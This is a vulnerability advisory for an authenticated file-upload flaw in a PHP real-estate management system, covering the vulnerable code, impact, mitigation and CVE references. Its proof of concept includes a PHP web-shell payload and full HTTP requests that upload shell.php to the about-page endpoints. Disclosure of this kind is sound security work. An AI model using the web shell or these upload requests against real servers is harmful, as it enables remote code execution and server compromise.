## Vulnerability Details:
- **Application Name**: Codeastro Real Estate Management System 
- **Software Link**: [Download Link](https://codeastro.com/real-estate-management-system-in-php-with-source-code/)
- **Vendor Homepage**: [Vendor Homepage](https://codeastro.com/)
- **BuG**: Arbitrary Authenticated File Upload Leading to Remote Code Execution (RCE)
- **BUG_Author**: egsec

## About project:
In particular, this Real Estate Management System Project in PHP focuses mainly on publishing and viewing properties. To be more precise, the system helps to keep a number of sales and rental properties.

## Vulnerability Description:
- The vulnerability arises from the lack of proper file validation and authentication checks in the file upload mechanism of the application. Both `/aboutadd.php` and `/aboutedit.php` endpoints allow authenticated admin to upload image files intended for the "About Page". However, the system does not properly validate the content type or check for the file's executable nature. As a result, an attacker could upload a malicious file (such as a PHP reverse shell) disguised as a legitimate image. Once the file is uploaded, the server processes it without detecting its harmful nature. This allows attackers to execute arbitrary code on the server, potentially leading to remote code execution (RCE).

## Vulnerable Code Section:
- for `/aboutadd.php`:
```php
<?php
...
$aimage=$_FILES['aimage']['name'];
$temp_name1 = $_FILES['aimage']['tmp_name'];
move_uploaded_file($temp_name1,"upload/$aimage");
...
?>
```
- for `/aboutedit.php`:
```php
<?php
...
$aimage=$_FILES['aimage']['name'];
$temp_name1 = $_FILES['aimage']['tmp_name'];
move_uploaded_file($temp_name1,"upload/$aimage");
...
?>
```

- Lack of File Type Validation: The code does not verify that the uploaded file is an actual image (e.g., by checking its MIME type or extension). This allows an attacker to upload files with executable code (such as a PHP reverse shell).

- Direct Use of File Name: The variable $aimage uses the original file name provided by the user, which is then directly moved into the upload/ directory. An attacker could upload a file like shell.php, which would then be accessible via the web server as /upload/shell.php, enabling them to execute code.

## Proof of Concept (PoC):
- create malicious file like shell.php
- write in the file this payload in order to execute the commands: `<?php system($_GET['cmd']);?>`
- go to the these pages for uploading file => `http://localhost/RealEstate-PHP/admin/aboutadd.php` and `http://localhost/RealEstate-PHP/admin/aboutedit.php?id=<page_id>`

![aboutadd](https://github.com/user-attachments/assets/77bc6064-058c-4f50-9f57-c1c2806a359c)

![aboutedit](https://github.com/user-attachments/assets/b80b255f-5287-46ab-8854-e3441eefae42)

- upload the malicious file (shell.php)
- after submitting, shell.php will be uploaded to the `http://localhost/RealEstate-PHP/admin/upload/` directory
- request to the shell.php file and get the shell => `http://localhost/RealEstate-PHP/admin/upload/shell.php?cmd=<command>`
- after executing "dir" command (for windows machnine), the files will be listed in the relevant directory:

![image](https://github.com/user-attachments/assets/2c058aa1-a374-4dec-95d2-c7b985a19391)

- request for `/aboutadd.php`:
```python
POST /RealEstate-PHP/admin/aboutadd.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------223874015127163847964204694679
Content-Length: 627
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/RealEstate-PHP/admin/aboutadd.php
Cookie: PHPSESSID=2k9gqipambd24c5lfpn99bcseu
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

-----------------------------223874015127163847964204694679
Content-Disposition: form-data; name="title"

test
-----------------------------223874015127163847964204694679
Content-Disposition: form-data; name="aimage"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']);?>

-----------------------------223874015127163847964204694679
Content-Disposition: form-data; name="content"

<p>test</p>
-----------------------------223874015127163847964204694679
Content-Disposition: form-data; name="addabout"

Submit
-----------------------------223874015127163847964204694679--
```
- response for `/aboutadd.php`:
```python
HTTP/1.1 200 OK
Date: Wed, 06 Nov 2024 19:26:20 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
X-Powered-By: PHP/8.2.12
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 9083
```

- request for `/aboutedit.php`:
```python
POST /RealEstate-PHP/admin/aboutedit.php?id=11 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------291824796116344584804150147564
Content-Length: 625
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/RealEstate-PHP/admin/aboutedit.php?id=11
Cookie: PHPSESSID=2k9gqipambd24c5lfpn99bcseu
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

-----------------------------291824796116344584804150147564
Content-Disposition: form-data; name="utitle"

asd
-----------------------------291824796116344584804150147564
Content-Disposition: form-data; name="ucontent"

<p>asd</p>
-----------------------------291824796116344584804150147564
Content-Disposition: form-data; name="aimage"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']);?>

-----------------------------291824796116344584804150147564
Content-Disposition: form-data; name="update"

Submit
-----------------------------291824796116344584804150147564--
```
- response for `/aboutedit.php`:
```python
HTTP/1.1 302 Found
Date: Wed, 06 Nov 2024 19:33:25 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
X-Powered-By: PHP/8.2.12
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: aboutview.php?msg=<p class='alert alert-success'>About Updated</p>
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 9337
```
## Impact:
This vulnerability allows attackers to upload and execute arbitrary code on the server. The consequences of successful exploitation include:

    Unauthorized remote code execution on the server
    Potential access to sensitive system information or data
    Compromise of the server and other connected systems
    Escalation of privileges, depending on the attacker’s access level

## Mitigation:
- Verify that the uploaded file is an image by checking its MIME type and extension. For example:
```php
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
$file_type = mime_content_type($temp_name1);

if (!in_array($file_type, $allowed_types)) {
    die("Error: Only JPG, PNG, and GIF files are allowed.");
}
```
- Attackers can bypass file type checks by renaming malicious files with image extensions (e.g., .jpg). To enhance security, validate the file extension:
```php
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$file_extension = pathinfo($aimage, PATHINFO_EXTENSION);

if (!in_array($file_extension, $allowed_extensions)) {
    die("Error: Invalid file extension.");
}
```

## References:
- [cvefeed.io link for CVE-2024-10999](https://cvefeed.io/vuln/detail/CVE-2024-10999)
- [cvefeed.io link for CVE-2024-11000](https://cvefeed.io/vuln/detail/CVE-2024-11000)
